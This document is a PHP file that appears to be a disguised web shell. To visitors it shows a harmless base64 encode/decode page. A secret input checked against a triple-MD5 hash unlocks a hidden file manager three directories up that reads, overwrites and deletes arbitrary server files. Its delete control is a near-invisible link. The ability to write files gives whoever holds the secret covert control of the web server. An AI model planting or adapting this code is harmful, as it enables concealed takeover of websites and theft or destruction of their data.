<?PHP
header("Content-type: text/html; charset=utf-8");
if(Extension_Loaded('zlib')) Ob_Start('ob_gzhandler'); 
session_start();
if(!isset($_SESSION['sess_act'])||$_SESSION['sess_act']==''){
  $be = isset($_GET['be'])?$_GET['be']:'';
  $bd = isset($_GET['bd'])?$_GET['bd']:'';
  if($be!=''){
    $bd = base64_encode($be);
    if(md5(md5(md5($be)))=='dd9548c4d9c99dbf01f8e2e4031c37b5'){$_SESSION['sess_act']='1';header('Location:?');exit;}
  }
  if($bd!=''){
    $be = base64_decode($bd);
  }
  echo '
    base64_encode:<input type="text" id="be" value="'. $be . '" /> <input type="button" onclick="location.href=\'?be=\'+document.getElementById(\'be\').value;" value="加密"/><br>
    base64_decode:<input type="text" id="bd" value="'. $bd . '" /> <input type="button" onclick="location.href=\'?bd=\'+document.getElementById(\'bd\').value;" value="解密"/><br>
  ';exit;
}else{
  $be = isset($_GET['be'])?$_GET['be']:'';
  if(md5(md5(md5($be)))=='5e8e56e7bcf46c5cdf0f2a104f17670f'){$_SESSION['sess_act']='';header('Location:?be='.$be);exit;}
}
Header("Content-type: text/html"); 
?> 
<?php  
 //获取文件目录列表,该方法返回数组  
 function getDir($dir) {
     $dirArray[]=NULL;
     if (false != ($handle = opendir ( $dir ))) {
         $i=0;
         while ( false !== ($file = readdir ( $handle )) ) {
             //去掉"“.”、“..”以及带“.xxx”后缀的文件
             if ($file != "." && $file != ".."&&!strpos($file,".")) {
                 $dirArray[$i]=$file;
                 $i++;
             }
         }
         //关闭句柄
         closedir ( $handle );
     }
     return $dirArray;
 }

 //获取文件列表
function getFile($dir) {
     $fileArray[]=NULL;
     if (false != ($handle = opendir ( $dir ))) {
         $i=0;
         while ( false !== ($file = readdir ( $handle )) ) {
             //去掉"“.”、“..”以及带“.xxx”后缀的文件
             if ($file != "." && $file != ".."&&strpos($file,".")) {
                 $fileArray[$i]=$file;//$dir.
                 if($i==100){
                     break;
                 }
                 $i++;
             }
         }
         //关闭句柄
         closedir ( $handle );
     }
     return $fileArray;
}

function showAllFiles($dir){
  $dirs=getDir($dir);
  $files=getFile($dir);
  foreach($dirs as $key){
    if($key)echo "<font color='#EEB943'>[Dir] </font><a class='a1' href='?dir={$dir}{$key}/'>{$key}</a><br>";
  }
  if($files){
  foreach($files as $key){
    if($key)echo "<font color='#5CA9BC'>[File]</font><a name='".substr($key,0,1)."' href='?dir={$dir}&file={$key}'>{$key}</a><br>";
  }}
}

function File_Read($filename)
{
	$handle = @fopen($filename,"rb");
	$filecode = @fread($handle,@filesize($filename));
	@fclose($handle);
	return $filecode;
}

function File_Write($filename,$filecode,$filemode)
{
  @touch($filename);
	$key = true;
	$handle = @fopen($filename,$filemode);
	if(!@fwrite($handle,$filecode))
	{
	@chmod($filename,0666);
	$key = @fwrite($handle,$filecode) ? true : false;
	}
@fclose($handle);
return $key;
}

//操作实例
$baseDir="../../../";

$dir=str_replace($baseDir,'',(isset($_REQUEST['dir'])?$_REQUEST['dir']:''));
$dir =$baseDir.preg_replace("/([\.])\\1+/",'$1',$dir);
$file=isset($_REQUEST['file'])?$_REQUEST['file']:'';

$act=isset($_GET['act'])?$_GET['act']:'';
if($act=='savefile'){
$con = (isset($_POST['editcon'])?$_POST['editcon']:'');
File_Write("{$dir}{$file}",$con,'wb');
header("location:?dir={$dir}&file={$file}");exit;
}
if($act=='delfile'){
@unlink("{$dir}{$file}");
header("location:?dir={$dir}");exit;
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>文件管理系统</title>
<style>
body{padding:0;margin:0;font-size:12px;line-height:1.5;}
.clr{clear:both;height:0;line-height:0;font-size:0;overflow:hidden;}
.a1{text-decoration:none;color:#888;font-weight:700}
.a2{}
.top{width:100%-2px;height:40px;border:1px solid blue;}
.top1{height:24px;margin:2px;padding:5px;border:1px solid blue;line-height:26px;}
.con{width:100%-2px;border:1px solid blue;margin-top:2px;padding:2px;}
.con_left{width:200px;height:400px;overflow:auto;background:#fff;padding:5px;border:1px solid blue;float:left;}
.con_right{margin-left:214px;height:400px;overflow:hidden;border:1px solid blue;padding:5px;}
.foot{margin-top:2px;text-align:center;}
.h400{height:420px;}
.editDiv{BORDER: #999999 1px solid; PADDING: 3px;OVERFLOW-Y: auto;FONT-WEIGHT: normal; FONT-SIZE: 12px; OVERFLOW-X: hidden;COLOR: #000066;WORD-BREAK: break-all; FONT-STYLE: normal; FONT-FAMILY: SIMSUN; HEIGHT: 380px}
</style>
</head>
<body>
<div class="top">
  <div class="top1">
   <span style="float:right;">
    【<a href="/" target="_blank">网站首页</a>】
    【<a href="#t1">选择模板</a>】
    【<a href="#t2">新建文档</a>】
    【<a href="#t3">建文件夹</a>】
    【<a href="#t4">新建文档</a>】
    </span>
   当前:<?=$dir?> [<a href="?dir=<?=dirname($dir)?>/">上一级</a>]
  </div>
</div>
<div class="con">
  <div class="con_left" id="con_left">
    <?=showAllFiles($dir);?>
  </div>
  <div class="con_right" id="con_right">
    <a name="t1"></a>
    <div class="h400">
      <form action="?act=savefile" method="post" style="padding:0;margin:0;">
      <div style="height:25px;">
      &lt;&lt;
      文件名:<input type="text" name="file" id="file" value="<?=$file?>">
      &gt;&gt; ++++ &lt;&lt;
      <input type="submit" value=" 保存 ">
      &gt;&gt; <a href="#" style="text-decoration:none" onclick="location.href='?act=delfile&dir=<?=$dir?>&amp;file='+document.getElementById('file').value;">&nbsp;</a>
      ++++ &lt;&lt;
      <font size="3"><input id="string" type="text" size="15" onChange="n = 0;"></font> <input type="button" onclick="return findInPage(document.getElementById('string').value)" value="本页面查找">
      &gt;&gt;
&nbsp;&nbsp;&nbsp; <span id="place">1</span>
      </div>
      <textarea style="width:98.5%;height:370px;" name="editcon" id="editcon"><?=htmlspecialchars(File_READ("{$dir}{$file}"))?></textarea>
      <input type="hidden" name="dir" value="<?=$dir?>" />
      </form>
    </div>
    <a name="t2"></a>
    <div class="h400">test2</div>
    <a name="t3"></a>
    <div class="h400">test3</div>
    <a name="t4"></a>
    <div class="h400">
    base64_encode:<input type="text" id="be" value="" /> <input type="button" onclick="location.href='?be='+document.getElementById('be').value;" value="加密"/><br>
    base64_decode:<input type="text" id="bd" value="" /> <input type="button" onclick="location.href='?bd='+document.getElementById('bd').value;" value="解密"/><br>
    </div>
  </div>
  <div class="clr"></div>
</div>
<div class="top foot">
  <div class="top1">
    HK - 在线编辑器
  </div>
</div>
<script>
document.getElementById("con_left").onkeyup = function keyPress(event) 
{ 
 var wkey=0 ;
 if(document.all) wkey=window.event.keyCode; 
 if(document.layers) wkey=event.which; 
 location.href=location.href.split("#")[0]+"#"+String.fromCharCode(wkey); 
} 

var NS4 = (document.layers);    // Which browser?
var IE4 = (document.all);
var win = window;    // window to search.
var n   = 0;
function findInPage(str) {
  var txt, i, found;
  if (str == "")
    return false;
  if (NS4) {
    if (!win.find(str))
     while(win.find(str, false, true))
        n++;
    else
      n++;
    if (n == 0)
      alert("Not found.");
  }
  if (IE4) {
    txt = win.document.body.createTextRange();
    for (i = 0; i <= n && (found = txt.findText(str)) != false; i++) {
      txt.moveStart("character", 1);
      txt.moveEnd("textedit");
    }
    if (found) {
      txt.moveStart("character", -1);
      txt.findText(str);
      txt.select();
      txt.scrollIntoView();
      n++;
    }
    else {
     if (n > 0) {
        n = 0;
        findInPage(str);
      }
      else
        alert("Not found.");
    }
  }
  return false;
}
document.onkeyup=function(event){
if((window.event.altKey) && (window.event.keyCode == 83)){ 
document.forms[0].submit(); return false;
}
}

var $id=function(id){return document.getElementById(id);}
$id("editcon").onmousemove = mouseMove;
function mouseMove(ev){  ev= ev || window.event;
      var mousePos = mouseCoords(ev);  
      $id("place").innerHTML="x="+ mousePos.x + ",y="+ mousePos.y + ",s="+ $id("editcon").scrollTop + " 第 "+ (parseInt((mousePos.y+$id("editcon").scrollTop)/16)-4) +" 行";
}   
function mouseCoords(ev){
if(ev.pageX || ev.pageY){return {x:ev.pageX, y:ev.pageY};}
return {x:ev.clientX + document.body.scrollLeft - document.body.clientLeft,y:ev.clientY + document.body.scrollTop - document.body.clientTop };
} 

</script>
</body>
</html>
<?PHP if(Extension_Loaded('zlib')) Ob_End_Flush(); ?>